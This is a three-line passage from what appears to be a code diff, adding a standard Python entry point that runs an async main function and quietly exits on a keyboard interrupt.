+        asyncio.run(main())
+    except KeyboardInterrupt:
+        pass
